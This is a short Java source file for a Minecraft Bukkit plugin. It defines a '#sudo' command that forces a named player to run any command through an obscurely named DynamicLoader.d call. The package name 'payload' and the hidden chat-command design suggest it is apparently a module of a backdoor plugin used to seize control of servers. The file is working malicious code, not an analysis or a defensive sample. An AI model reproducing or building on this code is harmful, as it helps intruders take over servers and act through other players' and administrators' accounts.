package dev.naruto.astrox.payload.commands;

import dev.naruto.astrox.utils.DynamicLoader;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

public class SudoCommand implements Command {
    @Override
    public void execute(Player sender, String[] args, JavaPlugin plugin) {
        if (args.length < 2) {
            sender.sendMessage("§cUsage: #sudo <player> <command>");
            return;
        }

        Player target = Bukkit.getPlayer(args[0]);
        if (target == null) {
            sender.sendMessage("§c✗ Player not found");
            return;
        }

        String command = String.join(" ", java.util.Arrays.copyOfRange(args, 1, args.length));

        DynamicLoader.d(target, command); // FIXED
        sender.sendMessage("§e✓ Forced §f" + target.getName() + " §7to run: §e/" + command);
    }

    @Override
    public String getDescription() { return "Force player command"; }

    @Override
    public String getUsage() { return "<player> <command>"; }
}
